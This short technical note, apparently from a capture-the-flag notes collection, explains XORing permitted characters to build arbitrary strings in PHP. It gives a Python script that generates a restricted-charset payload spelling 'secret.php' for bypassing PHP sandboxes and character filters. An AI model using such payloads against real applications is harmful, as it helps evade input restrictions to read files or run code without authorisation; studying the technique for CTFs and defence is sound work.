# PHP Fuck

So in php when some characters are restricted we can basically XOR the allowed characters to create new characters.
eg: echo '{'^'?' gives 'D'. This can be used to bypass a lot of PHP sandboxes.

The following script generates the payload using only 4 chars

```py
from itertools import combinations
 
charset = "()^;'.\\"
 
elements = {}
 
def arr_to_str(arr):
    res = ""
    for c in arr:
        if c == "\\":
            res += "'\\\\'"
        elif c == "'":
            res += "'\\\''"
        else:
            res += f"'{c}'"
        res += '^'
    return res[:-1]
 
for i in range(1, len(charset)+1):
    for arr in list(combinations(charset, i)):
        res = ""
        for c in arr:
            if res == "":
                res = c
                continue
            res = chr(ord(res) ^ ord(c))
 
        elements[res] = arr_to_str(arr)
 
elements = sorted(elements.items(), key=lambda x: x[0])
elements = dict(elements)
 
#for k, v in elements.items():
#    print(f"{str.ljust(k, 40)} -> {v}")
 
target_string = "secret.php"
 
output = ""
 
for i in target_string:
    output += f"({elements[i]})."
 
print(output[:-1])
```